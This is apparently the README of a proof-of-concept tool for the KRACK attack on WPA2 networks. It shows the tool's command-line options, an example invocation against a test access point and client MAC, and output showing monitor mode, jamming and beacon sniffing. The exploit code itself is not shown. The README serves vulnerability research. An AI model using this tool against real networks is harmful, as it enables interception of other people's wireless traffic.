Feel free to use and modify it, but I won't answer to any comment/issue anymore. This project was difficult, I learnt what I wanted to learn, and developed what I wanted to develop, a quick-one-win to validate my comprehension of the vulnerability. Proof of concept for Krack attack using channel-based MitM Theory French article on hackndo Environment WPA2 with CCMP Usage # ./Krack.py -h usage: Krack.py [-h] [-d] -a ACCESS_POINT -i IFACE_AP -b CLIENT -j IFACE_CLIENT -c CHANNEL optional arguments: -h, --help show this help message and exit -d, --direct Skip channel and monitor settings -a ACCESS_POINT, --access_point ACCESS_POINT Enter the SSID of the specific access point to target -i IFACE_AP, --iface_ap IFACE_AP Enter the SSID of the specific access point to target -b CLIENT, --client CLIENT Enter the MAC address of the specific client to target -j IFACE_CLIENT, --iface_client IFACE_CLIENT Enter the SSID of the specific access point to target -c CHANNEL, --channel CHANNEL Choose channel on which the targeted access point is listening on # ./Krack.py -a hackndo_ssid_test -i wlan1 -b "ab:cd:0a:0b:11:22" -j wlan0 -c 11 [*] Turning off both interfaces [*] Setting interface wlan1 on channel 11 [*] Interface wlan1 is on channel 11 [*] Setting interface wlan0 on channel 4 [*] Interface wlan0 is on channel 4 [*] Starting monitor mode for wlan1 [*] Interface wlan1 is now in monitor mode [*] Starting monitor mode for wlan0 [*] Interface wlan0 is now in monitor mode [*] Turning on both interfaces [*] Trying to find hackndo_ssid_test MAC address [*] MAC Found ! 0e:cc:46:8a:b1:09 [*] Jammer initialized correctly [*] Sniffing an AP Beacon...
